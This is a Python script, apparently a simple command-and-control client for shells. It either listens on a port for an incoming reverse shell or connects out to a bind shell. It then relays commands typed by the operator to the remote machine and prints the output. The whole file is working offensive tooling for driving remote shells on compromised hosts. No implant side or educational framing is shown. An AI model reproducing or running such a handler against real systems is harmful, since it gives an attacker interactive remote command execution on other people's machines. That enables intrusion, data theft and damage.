import argparse
import socket
import sys

# Global Variables
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#Bind socket to given port and listen for reverse shell
def listen(port):
    try:
        print("Listening for reverse shell on port: %d\n" % port)
        s.bind(('127.0.0.1', port))
        s.listen(1)
        conn, addr = s.accept()
        host_address = str(addr[0])
        host_port = int(addr[1])
        print('Connection established with %s from port: %d\n' % (host_address, host_port))
        data = conn.recv(16).decode("utf-8")
        print('%s\n' % data)
        send_commands(host_address, host_port, conn)
    except Exception as e:
        print("Exception encountered.  Exception is %s" % e)
        conn.close()
        s.close()
        sys.exit(1)


#Connect to given server for reverse shell
def connect(host, port):
    print("Attempting to connect to server: %s on port: %d\n" % (host, port))
    s.connect((host, port))
    print("Connection established with %s on port %d" % (host, port))
    #data = s.recv(16).decode('utf-8')
    #print(data)
    send_commands(host, port, s)


#Send commands to server
def send_commands(host, port, conn):
    while 1:
        try:
            prompt = conn.recv(13).decode('utf-8')
            sys.stdout.write(prompt)
            command = input()
            if len(command) > 0:
                if command == 'quit':
                    print("Quiting")
                    conn.sendto(b'quit', (host, port))
                    conn.close()
                    s.close()
                    sys.exit(1)
                else:
                    conn.sendto(bytearray(command+'\n', 'utf-8'), (host, port))
                    data = conn.recv(4096).decode('utf-8')
                    print(data)
            else:
                print("Enter a command!")
        except Exception as e:
            print("Exception is %s" % e)
            sys.exit(1)


#Get command line arguments
def get_args():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-l', '--listen', help='Listen for reverse shell.', action='store_true')
    group.add_argument('-c', '--connect', help='Connect to binding shell', action='store_true')
    parser.add_argument('-s', '--server', help='Server to connect to.')
    parser.add_argument('-p', '--port', help='Port to connect to or listen on')
    args = parser.parse_args()

    if str(len(sys.argv)) == '1':
        parser.print_help()
    elif args.listen:
        if args.port is not None:
            listen(int(args.port))
    elif args.connect:
        if args.server is not None and args.port is not None:
            connect(str(args.server), int(args.port))
    else:
        print("You idiot!!!")
        sys.exit(1)

if __name__ == "__main__":
    get_args()
